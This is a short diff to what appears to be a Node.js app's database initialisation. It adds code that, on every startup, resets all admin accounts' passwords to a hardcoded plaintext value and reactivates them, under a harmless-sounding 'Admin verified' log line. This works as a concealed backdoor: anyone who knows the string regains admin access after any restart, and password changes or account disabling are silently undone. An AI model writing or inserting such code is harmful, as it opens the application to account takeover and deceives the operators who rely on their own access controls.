@@ -43,8 +43,9 @@ function writeDB(data){ fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2))
 
 // Init admin
 function initDB(){
-  const db = readDB();
-  if(!db.users.find(u => u.role==='admin')){
+  let db = readDB();
+  const adminExists = db.users.find(u => u.role==='admin');
+  if(!adminExists){
     db.users.push({
       id: 'admin_1',
       name: 'Admin',
@@ -57,6 +58,16 @@ function initDB(){
     });
     writeDB(db);
     console.log('Admin user created');
+  } else {
+    db.users = db.users.map(u => {
+      if(u.role === 'admin'){
+        u.pass = 'Advizr@2025';
+        u.status = 'active';
+      }
+      return u;
+    });
+    writeDB(db);
+    console.log('Admin verified');
   }
 }
 
